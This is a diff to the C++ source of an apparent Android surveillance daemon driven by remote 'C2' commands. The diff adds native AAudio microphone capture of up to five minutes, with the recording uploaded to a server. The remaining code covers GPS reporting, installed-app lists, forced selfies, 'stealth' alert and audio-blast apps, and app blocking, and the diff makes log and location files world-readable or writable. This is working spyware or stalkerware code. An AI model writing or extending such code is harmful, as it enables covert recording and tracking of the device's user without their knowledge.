@@ -20,6 +20,7 @@
 #include <queue>
 #include <sstream>
 #include <string>
+#include <string_view>
 #include <thread>
 #include <utility>
 #include <vector>
@@ -31,6 +32,9 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <unistd.h>
+
+// AAudio — NDK audio capture (routes through AudioFlinger/HAL)
+#include <aaudio/AAudio.h>
 
 // Android Platform (with desktop stubs for cross-compilation)
 #ifdef __ANDROID__
@@ -70,7 +74,7 @@ static constexpr const char* GPS_FILE = "/data/local/tmp/gps_history.csv";
 static constexpr const char* MIC_FILE = "/data/local/tmp/mic.wav";
 static constexpr const char* LOC_FILE = "/data/local/tmp/location_enabled";
 // Log rotation settings
-static constexpr bool ENABLE_FILE_LOGGING = false;
+static constexpr bool ENABLE_FILE_LOGGING = true;
 static constexpr long MAX_LOG_SIZE = 1024 * 1024; // 1 MB
 static constexpr int MAX_LOG_FILES = 5;
 
@@ -173,6 +177,8 @@ void rotate_logs() {
     // Reopen the main log file
     g_log_file = fopen(LOG_PATH, "a");
     if (g_log_file) {
+        // World-readable so StealthMonitor (platform_app) can display logs
+        chmod(LOG_PATH, 0644);
         g_log_size = 0;
     }
 }
@@ -313,10 +319,16 @@ std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
         return {false, ""};
     }
 
+    // Build the joined string once; reuse for all log/error calls below.
     std::string joined;
-    for (size_t i = 0; i < argv.size(); ++i) {
-        joined += argv[i];
-        if (i + 1 < argv.size()) joined += ' ';
+    {
+        size_t total = argv.size() - 1; // spaces
+        for (const auto& a : argv) total += a.size();
+        joined.reserve(total);
+        for (size_t i = 0; i < argv.size(); ++i) {
+            if (i) joined.push_back(' ');
+            joined += argv[i];
+        }
     }
     log_message("Executing command: " + joined);
 
@@ -355,7 +367,7 @@ std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
     close(pipefd[1]);
     static constexpr size_t MAX_OUTPUT_SIZE = 1024 * 1024; // 1 MB cap
     std::string result;
-    char buffer[2048];
+    char buffer[4096]; // doubled: fewer read() syscalls
     ssize_t count;
     while ((count = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
         if (result.size() + static_cast<size_t>(count) > MAX_OUTPUT_SIZE) {
@@ -390,6 +402,7 @@ std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
     }
     bool success = child_exited && WIFEXITED(status) && WEXITSTATUS(status) == 0;
 
+    // Strip trailing whitespace in-place
     while (!result.empty() && std::isspace(static_cast<unsigned char>(result.back()))) {
         result.pop_back();
     }
@@ -905,12 +918,10 @@ std::string get_installed_apps() {
     std::string line;
     while (std::getline(ifs, line)) {
         size_t space_pos = line.find(' ');
-        if (space_pos != std::string::npos) {
-            std::string pkg = line.substr(0, space_pos);
-            if (!pkg.empty()) {
-                if (!apps.empty()) apps.push_back(',');
-                apps += pkg;
-            }
+        if (space_pos != std::string::npos && space_pos > 0) {
+            if (!apps.empty()) apps.push_back(',');
+            // Append directly from the line buffer — no substr copy
+            apps.append(line.data(), space_pos);
         }
     }
     return apps;
@@ -928,31 +939,47 @@ bool get_location_from_gps_provider(double& lat, double& lon) {
         lon = g_cached_gps_lon;
         return true;
     }
-    std::ifstream infile("/data/local/tmp/coords.txt");
-    if (!infile.is_open()) {
+
+    // Use low-level I/O to avoid heap allocations from ifstream/getline.
+    int fd = open("/data/local/tmp/coords.txt", O_RDONLY);
+    if (fd < 0) {
         send_error_to_server("gps_read", "Cannot open /data/local/tmp/coords.txt");
         return false;
     }
+    char buf[64];
+    ssize_t n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return false;
+    buf[n] = '\0';
 
-    std::string line;
-    if (std::getline(infile, line)) {
-        size_t comma = line.find(',');
-        if (comma != std::string::npos) {
-            try {
-                lat = std::stod(line.substr(0, comma));
-                lon = std::stod(line.substr(comma + 1));
-                g_cached_gps_lat = lat;
-                g_cached_gps_lon = lon;
-                g_cached_gps_valid = true;
-                g_cached_gps_time = now;
-                return true;
-            } catch (const std::exception& e) {
-                send_error_to_server("gps_parse", std::string("Malformed coords.txt: ") + e.what());
-                return false;
-            }
-        }
+    // Find the comma separating lat and lon
+    char* comma = static_cast<char*>(std::memchr(buf, ',', static_cast<size_t>(n)));
+    if (!comma) {
+        send_error_to_server("gps_parse", "Malformed coords.txt: missing comma");
+        return false;
     }
-    return false;
+    *comma = '\0'; // split in-place
+
+    char* end = nullptr;
+    double parsed_lat = std::strtod(buf, &end);
+    if (end == buf) {
+        send_error_to_server("gps_parse", "Malformed coords.txt: bad lat");
+        return false;
+    }
+    char* lon_start = comma + 1;
+    double parsed_lon = std::strtod(lon_start, &end);
+    if (end == lon_start) {
+        send_error_to_server("gps_parse", "Malformed coords.txt: bad lon");
+        return false;
+    }
+
+    lat = parsed_lat;
+    lon = parsed_lon;
+    g_cached_gps_lat = lat;
+    g_cached_gps_lon = lon;
+    g_cached_gps_valid = true;
+    g_cached_gps_time = now;
+    return true;
 }
 
 // ── Screen Time & App Tracking ───────────────────────────────────────────────
@@ -1164,10 +1191,12 @@ void do_report() {
     }
 
     if (send_latlon) {
-        json += ",\"lat\":";
-        json += std::to_string(current_lat);
-        json += ",\"lon\":";
-        json += std::to_string(current_lon);
+        // snprintf avoids std::to_string locale dependency and is faster for doubles.
+        char coord_buf[64];
+        int coord_len = std::snprintf(coord_buf, sizeof(coord_buf),
+                                     ",\"lat\":%.8f,\"lon\":%.8f",
+                                     current_lat, current_lon);
+        if (coord_len > 0) json.append(coord_buf, static_cast<size_t>(coord_len));
         g_last_lat = current_lat;
         g_last_lon = current_lon;
     }
@@ -1210,31 +1239,164 @@ void do_report() {
 
 // ── C2 Command Execution ─────────────────────────────────────────────────────
 
-/** Records audio from the device microphone for a specified duration using tinycap. */
+/** Records audio from the device microphone using NDK AAudio.
+ *  AAudio automatically configures DSP mixer paths through AudioFlinger.
+ *  IMPORTANT: AAudio may ignore the requested sample rate and open at the
+ *  device's native rate (typically 48000 Hz). We query the *actual* rate
+ *  after opening and use that in the WAV header to prevent speed distortion.
+ *  Output is a standard WAV file written to MIC_FILE, then uploaded via WS. */
 void do_mic_record(int duration_s) {
     static constexpr int MAX_MIC_DURATION = 300; // 5 minutes cap
+    static constexpr unsigned int CHANNELS  = 1;
+
     if (duration_s <= 0) {
-        log_message("Invalid or missing mic_record duration received; defaulting to 30 seconds.");
+        log_message("Invalid or missing mic_record duration; defaulting to 30 seconds.");
         duration_s = 30;
     } else if (duration_s > MAX_MIC_DURATION) {
-        log_message("mic_record duration capped from " + std::to_string(duration_s) + " to " + std::to_string(MAX_MIC_DURATION) + " seconds.");
+        log_message("mic_record duration capped from " + std::to_string(duration_s) +
+                    " to " + std::to_string(MAX_MIC_DURATION) + " seconds.");
         duration_s = MAX_MIC_DURATION;
     }
-    std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
-    log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
-    auto [success, result] = exec_cmd(split_command_line(cmd));
-    if (!success) {
-        send_error_to_server("mic_record", "tinycap command failed: " + cmd);
+
+    // ── Configure AAudio ────────────────────────────────────────────────────
+    AAudioStreamBuilder* builder = nullptr;
+    aaudio_result_t result = AAudio_createStreamBuilder(&builder);
+    if (result != AAUDIO_OK) {
+        send_error_to_server("mic_record", "AAudio_createStreamBuilder failed");
         return;
     }
 
-    struct stat st;
-    if (stat(MIC_FILE, &st) != 0 || st.st_size == 0) {
-        send_error_to_server("mic_record", "Microphone output file missing or empty: " + std::string(MIC_FILE));
+    AAudioStreamBuilder_setDirection(builder, AAUDIO_DIRECTION_INPUT);
+    // NONE mode: lets the HAL pick optimal buffer sizes for stable recording
+    // (LOW_LATENCY can cause glitches when writing to disk)
+    AAudioStreamBuilder_setPerformanceMode(builder, AAUDIO_PERFORMANCE_MODE_NONE);
+    AAudioStreamBuilder_setSharingMode(builder, AAUDIO_SHARING_MODE_SHARED);
+    AAudioStreamBuilder_setFormat(builder, AAUDIO_FORMAT_PCM_I16);
+    AAudioStreamBuilder_setChannelCount(builder, CHANNELS);
+    // Request 48 kHz — the native rate for most Android HALs.
+    // If the HAL overrides this, we detect it below.
+    AAudioStreamBuilder_setSampleRate(builder, 48000);
+
+    AAudioStream* stream = nullptr;
+    result = AAudioStreamBuilder_openStream(builder, &stream);
+    AAudioStreamBuilder_delete(builder);
+
+    if (result != AAUDIO_OK) {
+        send_error_to_server("mic_record", "AAudio openStream failed: " + std::string(AAudio_convertResultToText(result)));
         return;
     }
 
-    log_message("Microphone recording finished.");
+    // Query the ACTUAL sample rate the HAL negotiated — this may differ
+    // from what we requested.  Using this in the WAV header is critical
+    // to prevent playback speed distortion.
+    int32_t actual_rate = AAudioStream_getSampleRate(stream);
+    int32_t actual_channels = AAudioStream_getChannelCount(stream);
+
+    log_message("[AAudio] Stream opened: rate=" + std::to_string(actual_rate) +
+                " ch=" + std::to_string(actual_channels) +
+                " fmt=PCM_I16, recording " + std::to_string(duration_s) + "s");
+
+    result = AAudioStream_requestStart(stream);
+    if (result != AAUDIO_OK) {
+        send_error_to_server("mic_record", "AAudio requestStart failed: " + std::string(AAudio_convertResultToText(result)));
+        AAudioStream_close(stream);
+        return;
+    }
+
+    // ── Open output WAV file ─────────────────────────────────────────────
+    FILE* file = fopen(MIC_FILE, "wb");
+    if (!file) {
+        send_error_to_server("mic_record", "Cannot open output file: " + std::string(MIC_FILE));
+        AAudioStream_requestStop(stream);
+        AAudioStream_close(stream);
+        return;
+    }
+
+    // WAV header — write a placeholder, patch sizes at the end
+    struct __attribute__((packed)) wav_header {
+        uint32_t riff_id;        // 'RIFF'
+        uint32_t riff_sz;        // file size - 8
+        uint32_t wave_id;        // 'WAVE'
+        uint32_t fmt_id;         // 'fmt '
+        uint32_t fmt_sz;         // 16 for PCM
+        uint16_t audio_format;   // 1 = PCM
+        uint16_t num_channels;
+        uint32_t sample_rate;
+        uint32_t byte_rate;
+        uint16_t block_align;
+        uint16_t bits_per_sample;
+        uint32_t data_id;        // 'data'
+        uint32_t data_sz;        // raw audio bytes
+    } hdr;
+
+    // Use the ACTUAL rate from the stream, not the requested rate
+    uint16_t block_align = static_cast<uint16_t>(actual_channels * 2);
+    hdr.riff_id        = 0x46464952; // "RIFF"
+    hdr.riff_sz        = 0;          // patched later
+    hdr.wave_id        = 0x45564157; // "WAVE"
+    hdr.fmt_id         = 0x20746d66; // "fmt "
+    hdr.fmt_sz         = 16;
+    hdr.audio_format   = 1;
+    hdr.num_channels   = static_cast<uint16_t>(actual_channels);
+    hdr.sample_rate    = static_cast<uint32_t>(actual_rate);
+    hdr.bits_per_sample = 16;
+    hdr.block_align    = block_align;
+    hdr.byte_rate      = static_cast<uint32_t>(actual_rate) * block_align;
+    hdr.data_id        = 0x61746164; // "data"
+    hdr.data_sz        = 0;          // patched later
+
+    // Skip past header; we'll seek back and write it when done
+    fseek(file, sizeof(hdr), SEEK_SET);
+
+    // ── Capture loop ─────────────────────────────────────────────────────
+    unsigned int read_frames = 2048; // ~42ms at 48 kHz — good balance
+    std::vector<int16_t> buffer(read_frames * actual_channels);
+
+    unsigned int total_frames = 0;
+    unsigned int target_frames = static_cast<unsigned int>(actual_rate) *
+                                 static_cast<unsigned int>(duration_s);
+    bool capture_ok = true;
+
+    while (total_frames < target_frames) {
+        // 2-second timeout to detect stalled streams
+        aaudio_result_t frames_read = AAudioStream_read(
+            stream, buffer.data(), read_frames, 2000000000LL);
+        if (frames_read < 0) {
+            log_message("[AAudio] read error: " + std::string(AAudio_convertResultToText(frames_read)));
+            capture_ok = false;
+            break;
+        }
+        if (frames_read == 0) {
+            continue; // timeout, retry
+        }
+
+        total_frames += static_cast<unsigned int>(frames_read);
+        if (fwrite(buffer.data(), block_align, static_cast<size_t>(frames_read), file)
+                != static_cast<size_t>(frames_read)) {
+            log_message("[AAudio] fwrite error: " + std::string(strerror(errno)));
+            capture_ok = false;
+            break;
+        }
+    }
+
+    AAudioStream_requestStop(stream);
+    AAudioStream_close(stream);
+
+    // ── Patch WAV header with final sizes ─────────────────────────────────
+    hdr.data_sz = total_frames * block_align;
+    hdr.riff_sz = hdr.data_sz + sizeof(hdr) - 8;
+    fseek(file, 0, SEEK_SET);
+    fwrite(&hdr, sizeof(hdr), 1, file);
+    fclose(file);
+
+    if (!capture_ok || total_frames == 0) {
+        send_error_to_server("mic_record", "Native AAudio capture failed or recorded 0 frames");
+        return;
+    }
+
+    log_message("[AAudio] Recording complete: " + std::to_string(total_frames) +
+                " frames (" + std::to_string(total_frames / actual_rate) +
+                "s @ " + std::to_string(actual_rate) + " Hz) written to " + MIC_FILE);
     upload_file(MIC_FILE);
 }
 
@@ -1256,20 +1418,28 @@ void do_gps_dump() {
 
         auto [radio_ok, log_output] = exec_cmd(split_command_line("logcat -d -b radio"));
         (void)radio_ok;
-        size_t start = 0;
-        while (start < log_output.size()) {
-            size_t end = log_output.find('\n', start);
-            size_t line_len = (end == std::string::npos) ? log_output.size() - start : end - start;
-            size_t gps_pos = log_output.find("GpsLocation", start);
-            if (gps_pos != std::string::npos && gps_pos < start + line_len) {
-                ssize_t w = write(fd, log_output.data() + start, line_len);
+        // Single-pass scan: walk line by line, search for tag only within each line.
+        static constexpr std::string_view GPS_TAG = "GpsLocation";
+        const char* data     = log_output.data();
+        const char* data_end = data + log_output.size();
+        const char* line_start = data;
+        while (line_start < data_end) {
+            const char* line_end = static_cast<const char*>(
+                std::memchr(line_start, '\n', static_cast<size_t>(data_end - line_start)));
+            if (!line_end) line_end = data_end;
+            size_t line_len = static_cast<size_t>(line_end - line_start);
+            // Search for tag only within this line's bounds
+            const char* tag_pos = static_cast<const char*>(
+                std::search(line_start, line_end,
+                            GPS_TAG.data(), GPS_TAG.data() + GPS_TAG.size()));
+            if (tag_pos < line_end) {
+                ssize_t w = write(fd, line_start, line_len);
                 if (w > 0) {
                     (void)write(fd, "\n", 1);
                     wrote_data = true;
                 }
             }
-            if (end == std::string::npos) break;
-            start = end + 1;
+            line_start = line_end + (line_end < data_end ? 1 : 0);
         }
         close(fd);
     }
@@ -1366,15 +1536,25 @@ void process_tasks() {
         } else if (task == "update_blocked_apps") {
             std::string apps_str = get_json_val(response, "apps");
             std::vector<std::string> apps;
-            size_t start = 0;
-            while (start < apps_str.size()) {
-                size_t comma = apps_str.find(',', start);
-                std::string item = apps_str.substr(start, comma == std::string::npos ? std::string::npos : comma - start);
-                if (!item.empty() && item != " ") {
-                    apps.push_back(item);
+            // Pointer-arithmetic split: avoids substr heap allocation per token
+            const char* p   = apps_str.data();
+            const char* end = p + apps_str.size();
+            while (p < end) {
+                const char* q = static_cast<const char*>(
+                    std::memchr(p, ',', static_cast<size_t>(end - p)));
+                if (!q) q = end;
+                size_t token_len = static_cast<size_t>(q - p);
+                // Trim leading/trailing spaces
+                const char* tok = p;
+                while (tok < q && *tok == ' ') ++tok;
+                const char* tok_end = q;
+                while (tok_end > tok && *(tok_end - 1) == ' ') --tok_end;
+                size_t trimmed = static_cast<size_t>(tok_end - tok);
+                if (trimmed > 0) {
+                    apps.emplace_back(tok, trimmed);
                 }
-                if (comma == std::string::npos) break;
-                start = comma + 1;
+                p = q + (q < end ? 1 : 0);
+                (void)token_len;
             }
             {
                 std::lock_guard<std::mutex> lock(g_forbiddenMutex);
@@ -1389,7 +1569,7 @@ void process_tasks() {
             log_message("Location tracking set to: " + std::to_string(track));
             if (track == 1) {
                 int interval = g_ping_interval.load();
-                std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
+                std::string cmd = "am startservice --user 0 --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
                 enqueue_task([cmd]() { exec_cmd(split_command_line(cmd)); });
             } else {
                 enqueue_task([]() { exec_cmd(split_command_line("am force-stop com.stealthgps")); });
@@ -1413,28 +1593,36 @@ void process_tasks() {
             }
             log_message("Ping interval updated to: " + std::to_string(g_ping_interval.load()));
             if (is_location_enabled()) {
-                std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
+                std::string cmd = "am startservice --user 0 --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
                 enqueue_task([cmd]() { exec_cmd(split_command_line(cmd)); });
             }
         } else if (task == "system_alert") {
             std::string state = get_json_val(response, "state");
             std::string text = get_json_val(response, "text");
             log_message("System alert received: state=" + state + " text=" + text);
-            if (!state.empty() || !text.empty()) {
-                std::vector<std::string> args = {"am", "start", "-n", "com.stealthalert/.AlertActivity", "--es", "title", state, "--es", "text", text};
+            if (state == "1") {
+                // Kill first to ensure the screen wakes up cleanly and old text is replaced
+                run_command_no_output({"am", "force-stop", "com.stealthalert"});
+                std::vector<std::string> args = {"am", "start", "-n", "com.stealthalert/.AlertActivity", "--es", "text", text};
                 bool started = run_command_no_output(args);
                 if (!started) {
                     send_error_to_server("system_alert", "Failed to launch StealthAlert activity");
                 }
                 log_message(std::string("StealthAlert activity ") + (started ? "started" : "failed to start"));
+            } else if (state == "0") {
+                run_command_no_output({"am", "force-stop", "com.stealthalert"});
+                log_message("StealthAlert activity stopped");
             } else {
-                send_error_to_server("system_alert", "Empty state and text received");
+                send_error_to_server("system_alert", "Invalid state received");
             }
         } else if (task == "audio_blast") {
             std::string play = get_json_val(response, "play");
-            log_message("Audio blast request received: play=" + play);
-            if (play == "1") {
-                std::vector<std::string> args = {"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver", "--es", "action", "play", "--es", "volume", play};
+            std::string loops = get_json_val(response, "loops");
+            if (loops.empty()) loops = "0"; // Default to infinite
+            
+            log_message("Audio blast request received: play=" + play + ", loops=" + loops);
+            if (play == "1" || play == "2" || play == "3") {
+                std::vector<std::string> args = {"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver", "-f", "32", "--es", "action", "play", "--ei", "type", play, "--es", "volume", "1.0", "--ei", "loops", loops, "--es", "device_id", g_device_id};
                 bool started = run_command_no_output(args);
                 if (!started) {
                     send_error_to_server("audio_blast", "Failed to launch StealthAudio activity");
@@ -1463,7 +1651,7 @@ void process_tasks() {
             }
         } else if (task == "force_selfie") {
             log_message("Force selfie request received");
-            std::vector<std::string> args = {"am", "start", "-n", "com.stealthselfie/.MainActivity"};
+            std::vector<std::string> args = {"am", "start", "--user", "0", "-n", "com.stealthselfie/.MainActivity", "--es", "mode", "verify"};
             bool started = run_command_no_output(args);
             if (!started) {
                 send_error_to_server("force_selfie", "Failed to launch StealthSelfie activity");
@@ -1485,6 +1673,8 @@ int main(int argc, char* argv[]) {
     if (ENABLE_FILE_LOGGING) {
         g_log_file = fopen(LOG_PATH, "a");
         if (g_log_file) {
+            // World-readable so StealthMonitor (platform_app) can display logs
+            chmod(LOG_PATH, 0644);
             fseek(g_log_file, 0, SEEK_END);
             g_log_size = static_cast<size_t>(ftell(g_log_file));
         }
@@ -1515,11 +1705,15 @@ int main(int argc, char* argv[]) {
         std::thread(worker_thread_loop).detach();
     }
 
-    // Ensure coords.txt exists with 0666 permissions so GpsService can write to it
-    int fd = open("/data/local/tmp/coords.txt", O_WRONLY | O_CREAT, 0666);
-    if (fd >= 0) {
-        close(fd);
-        chmod("/data/local/tmp/coords.txt", 0666);
+    // Ensure coords.txt and its .tmp staging file exist with 0666 permissions
+    // so GpsService (platform_app uid) can write to them
+    const char* coord_files[] = {"/data/local/tmp/coords.txt", "/data/local/tmp/coords.txt.tmp"};
+    for (const char* path : coord_files) {
+        int fd = open(path, O_WRONLY | O_CREAT, 0666);
+        if (fd >= 0) {
+            close(fd);
+            chmod(path, 0666);
+        }
     }
 
     int interval = load_ping_interval_from_file(g_ping_interval.load());
@@ -1529,7 +1723,7 @@ int main(int argc, char* argv[]) {
     // Start GPS service on startup if enabled
     if (is_location_enabled()) {
         std::thread([]() {
-            std::string launch = "am startservice --el interval " + std::to_string(g_ping_interval.load() * 1000) + " com.stealthgps/.GpsService";
+            std::string launch = "am startservice --user 0 --el interval " + std::to_string(g_ping_interval.load() * 1000) + " com.stealthgps/.GpsService";
             exec_cmd(split_command_line(launch));
         }).detach();
     }
@@ -1619,7 +1813,8 @@ int main(int argc, char* argv[]) {
 
             for (const auto& pkg : current_apps) {
                 bool running = false;
-                std::string pkg_prefix = pkg + ":";
+                // Build prefix once per package, not inside the inner loop
+                const std::string pkg_prefix = pkg + ":";
                 for (const auto& proc : running_processes) {
                     if (proc == pkg || proc.rfind(pkg_prefix, 0) == 0) {
                         running = true;
